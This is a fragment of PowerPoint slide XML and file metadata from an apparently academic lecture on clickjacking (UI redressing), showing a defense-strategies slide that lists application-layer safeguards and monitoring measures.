              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048786" y="122796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D1D1F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="system-ui"/>
              </a:rPr>
              <a:t>Defense Strategies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4F96B-8D7E-4BE3-B0F4-4A2981E7C706}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1576633" y="1325087"/>
            <a:ext cx="60944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Layer 4: Application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Re-authentication for sensitive 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Multi-step confirmation dialogs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CAPTCHA for critical operations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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en-US" sz="2400" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1D1D1F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="system-ui"/>
              </a:rPr>
              <a:t>Layer 5: Monitoring</a:t>
            </a:r>
            <a:endParaRPr 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Detect unusual click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Monitor for framing attempts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D1D1F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="system-ui"/>
              </a:rPr>
              <a:t>Alert on sensitive action frequency</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24855954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</TotalTime>
  <Words>1899</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>320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Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>system-ui</vt:lpstr>
      <vt:lpstr>Retrospect</vt:lpstr>
      <vt:lpstr>Clickjacking / UI Redressing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Ahmad Nawaz Lecturer FCSE</dc:creator>
  <cp:lastModifiedBy>Muhammad Ahmad Nawaz Lecturer FCSE</cp:lastModifiedBy>
  <cp:revision>26</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-02-26T09:17:05Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-02-26T11:38:08Z</dcterms:modified>
</cp:coreProperties>
</file>